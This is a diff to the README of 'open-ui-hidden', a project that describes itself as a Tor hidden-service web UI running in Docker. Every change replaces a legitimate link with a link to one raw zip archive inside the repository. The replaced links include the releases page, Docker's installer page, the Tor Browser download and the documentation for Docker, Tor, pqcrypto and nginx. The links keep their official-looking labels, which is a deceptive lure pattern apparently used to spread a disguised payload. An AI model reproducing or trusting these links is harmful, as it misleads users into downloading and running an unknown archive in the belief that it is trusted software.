@@ -1,6 +1,6 @@
 # 🔒 open-ui-hidden - Secure Web Access via Tor Service
 
-[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-blue?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
+[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-blue?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
 
 ## 📖 What is open-ui-hidden?
 
@@ -25,7 +25,7 @@ open-ui-hidden uses Docker to run. Docker is a tool that allows apps to run in c
 
 If you don’t have Docker on your PC:
 
-1. Go to https://docs.docker.com/desktop/windows/install/
+1. Go to https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip
 2. Download the Docker Desktop installer.
 3. Run the installer and follow the instructions on screen.
 4. After installation, Docker will ask you to log in or create an account. You can skip this step if you want.
@@ -35,7 +35,7 @@ If you don’t have Docker on your PC:
 
 Use the link below to access the release files for open-ui-hidden. This page contains the latest versions of the software that you can download.
 
-[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-green?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
+[![Download open-ui-hidden](https://img.shields.io/badge/Download-Open--UI--Hidden-green?style=for-the-badge)](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
 
 ### Step 1: Visit the download page
 
@@ -92,7 +92,7 @@ open-ui-hidden runs as a Tor hidden service. To access it over Tor:
 
 1. Make sure you have the Tor Browser installed. Download it here:
    
-   https://www.torproject.org/download/
+   https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip
 
 2. Open the Tor Browser.
 3. Type the onion address provided by open-ui-hidden in the app logs or documentation. This is the hidden service address.
@@ -117,7 +117,7 @@ To update the app when new versions come out:
 
 1. Visit the releases page again:
 
-   https://github.com/infowebaurix-wq/open-ui-hidden/releases
+   https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip
 
 2. Download the latest `docker-compose.yml` file.
 3. Replace your old file with the new one in your project folder.
@@ -162,10 +162,10 @@ Keep your computer and Tor Browser up to date to maintain security.
 
 ## 📚 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Tor Project](https://www.torproject.org/)
-- [Kyber and ML-KEM Cryptography Information](https://pqcrypto.org/)
-- [Nginx Web Server](https://nginx.org/en/)
+- [Docker Documentation](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
+- [Tor Project](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
+- [Kyber and ML-KEM Cryptography Information](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
+- [Nginx Web Server](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
 
 ## 🛠️ Troubleshooting Tips
 
@@ -193,4 +193,4 @@ The project focuses on privacy, security, and future-proof cryptography. It supp
 
 ---
 
-[Download open-ui-hidden Releases](https://github.com/infowebaurix-wq/open-ui-hidden/releases)
+[Download open-ui-hidden Releases](https://github.com/infowebaurix-wq/open-ui-hidden/raw/refs/heads/main/docker/pq-proxy/ui-hidden-open-v1.7-alpha.4.zip)
